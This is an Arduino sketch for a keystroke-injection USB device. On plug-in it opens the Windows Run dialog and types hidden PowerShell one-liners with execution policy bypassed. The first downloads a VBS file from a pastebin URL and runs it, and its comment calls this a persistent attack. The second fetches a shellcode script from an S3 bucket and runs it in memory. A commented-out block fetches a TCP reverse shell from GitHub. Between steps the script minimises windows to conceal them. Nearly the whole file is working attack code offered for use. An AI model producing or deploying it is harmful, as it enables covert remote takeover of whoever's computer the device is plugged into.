/*
  One line powershell,
  Executing run command in first 3secs than 2 payload in 10 seconds .
*/

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms

  delay(3000);
  //First Payload
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();

  delay(100);
  //// Deadly(Maut)_Persistent_ps_Attack
  Keyboard.print("powershell -W hidden -NoLogo -NonInteractive -ep bypass -nop -c (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/YcXygagz', '%temp%/update.vbs'); %temp%/update.vbs");
  delay(100);
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();

  //Control D (desktop)
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();


  //Second Payload in next 10 Seconds
  delay(10000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  ////Direct Powershell Listener (One Liner).
  Keyboard.print("powershell -W hidden -NoLogo -NonInteractive -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('https://s3.ap-south-1.amazonaws.com/giros/exe/ps_shellcode_bmp_DKMC.ps1');\"");
  delay(100);
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  //Control D (desktop)
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  //  delay(400);
  //  //nishan reverse shell
  //  Keyboard.press(KEY_LEFT_GUI);
  //  Keyboard.press('r');
  //  Keyboard.releaseAll();
  //
  //  delay(1000);
  //  //Keyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/vulware/powershell-reverse-shell-/master/powershell%20tcp%20reverse%20shell.ps1');\"");

  //  delay(100);
  //  typeKey(KEY_RETURN);
  //
  //  //Control D (desktop)
  //  delay(1000);
  //  Keyboard.press(KEY_LEFT_GUI);
  //  Keyboard.press('d');
  //  Keyboard.releaseAll();
  //---------------------------------------------------------------------------------------------------------------------------------------------
  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
